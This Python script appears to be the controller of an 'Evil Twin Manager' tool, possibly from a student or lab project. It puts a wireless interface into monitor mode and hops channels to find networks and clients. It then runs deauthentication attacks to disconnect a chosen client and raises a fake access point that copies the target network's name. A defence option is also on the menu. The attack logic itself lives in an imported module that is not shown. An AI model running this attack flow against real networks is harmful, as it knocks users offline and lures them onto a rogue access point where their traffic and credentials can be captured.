import os
import sys
from colorama import Fore
import time
from datetime import datetime
import attack


def exit_and_cleanup(exit_code, message):
    """
    This function execute clean up , returning interface to manage mode , delte confs file and more..
    also perform exit with exit code.
    exit code 0 = the program has complete its purpose.
    """
    print_regular('Perform cleanup')
    os.system('sudo sh Templates/cleanup.sh')
    sys.exit('{} Perform exit() with exit code {} , {}'.format(Fore.WHITE, exit_code, message))


def monitor_mode(interface: str) -> None:
    """
    Change the interface mode to monitor mode,
    This will used by sniffer interface to sniff the packets.
    for more information : Please enter
    https://linux.die.net/man/8/iwconfig
    """
    bash('ifconfig ' + interface + ' down')
    bash('iwconfig ' + interface + ' mode monitor')
    bash('ifconfig ' + interface + ' up')


def search(word: str, text: str):
    """
    this is helper function that used to search if an interface is in iwconfig interfaces.
    :param word represent word we want to search in the text
    :param text represent the text
    """
    result = text.find(word)
    return result != -1


def bash(command: str):
    """
     execute bash command
    :param command represent the bash command we want to execute
    """
    return os.system(command)


def print_regular(message: str):
    """
    print regular messages to console
    :param message represent the message we want to print
    """
    print('{}{}'.format(Fore.WHITE, message))


def print_command(message: str):
    """
    print command messages to console
    :param message represent the command message we want to print
    """
    print('{}{}'.format(Fore.BLUE, message))


def print_errors(message: str):
    """
    print error messages to console (RED)
    :param message represent the error message we want to print
    """
    print('{}{}'.format(Fore.RED, message))


def print_header(message: str):
    """
    print a large header  to console (RED)
    :param message represent the header message we want to print
    """
    print(Fore.WHITE)
    bash('figlet {}'.format(message))


def handle_user_result():
    """
    return the user input for manage function
    """
    return input('{}[1] Perform Evil Twin Attack\n'
                 '[2] Perform Defence on Evil Twin Attack \n'
                 '[3] CleanUp'
                 'Please select one of the options mentioned above, or write quit to quit the manager\n'.format(
                    Fore.BLUE))


def channel_changing(interface: str, timeout_seconds, channel: int = 1):
    """
    This function changing the channel searching. (to identify networks and clients that uses other channels)
    :param timeout_seconds: function timeout
    :param interface: the interface that used to identify the networks / clients. (wlan0 for example)
    :param channel: the starting channel default is 1.
    """
    start_time = datetime.now()
    channel = channel
    while (datetime.now() - start_time).seconds < timeout_seconds:
        print('channel is {}'.format(channel))
        channel = (channel + 1) % 14
        bash('iwconfig {} channel {}'.format(interface, channel))
        time.sleep(1)


def start_defence_from_evil_attack():
    """
    This function is used for start the defence from evil attack ,
    using scapy deauthentication packet.
    for more information please look the README.MD
    """
    attack_obj = attack.Attack()
    ap_index = attack_obj.get_ap_index()
    defence_obj = attack.Defence(ap_index=ap_index)
    attack_obj.create_fake_access_point(attack.ap_list[int(ap_index)][0], True)
    defence_obj.display_problem(attack_obj.get_sniffer_interface())


def start_evil_twin_attack():
    """
    This function will execute Evil Twin Attack using Fake AP.
    """
    attack_obj = attack.Attack()
    ap_index = attack_obj.get_ap_index()
    ap = attack.get_ap(ap_index)
    if ap is None:
        exit_and_cleanup(-1, '{}general error ap is None'.format(Fore.RED))
    print_regular('Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0], ap[1]))
    print_regular(
        'Searching for users in all channels on Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0],
                                                                                                             ap[1]))
    client_index = attack_obj.get_client_index(ap)
    client = attack.get_client(client_index)
    print_header('deauthentication attack')
    print_regular('Perform deauthentication attack on Client MAC Address = {} and AP Name = {}\n'.format(client, ap[1]))
    attack_obj.deauthentication_attack(client, ap[1])
    attack_obj.create_fake_access_point(ap[0])


def manage():
    """
    This is the main program function , this function is responsible for the program flow.
    """
    print_header('Evil Twin Manager')
    print_command("Welcome To Evil Twin Manager")
    if os.geteuid():  # because scapy library must use root privileges.
        sys.exit('{}Perform exit() , Please run as root user , use sudo command , for more information please read '
                 'the README'.format(Fore.RED))

    while True:
        user_input = handle_user_result()
        if user_input == '1':
            start_evil_twin_attack()
            break
        elif user_input == '2':
            start_defence_from_evil_attack()
            break
        elif user_input == '3':
            exit_and_cleanup(0, 'Clean UP')
        elif user_input == 'quit':
            print_header('Bye Bye ...')
            exit(0)
        else:
            print_errors('Not a valid option please , Please try again.')


if __name__ == '__main__':
    manage()
